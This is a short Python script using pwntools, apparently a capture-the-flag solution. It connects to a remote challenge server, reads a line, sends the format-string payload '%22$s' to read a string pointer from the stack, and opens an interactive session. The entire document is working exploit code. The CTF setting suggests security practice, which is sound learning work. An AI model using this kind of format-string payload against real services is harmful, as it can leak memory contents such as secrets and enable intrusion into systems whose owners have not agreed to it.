from pwn import *


p = remote("challs.pwny.shellmates.club", 1002)
# p = process("./chall")
p.recvline()
p.sendline(f"%22$s")
p.interactive()
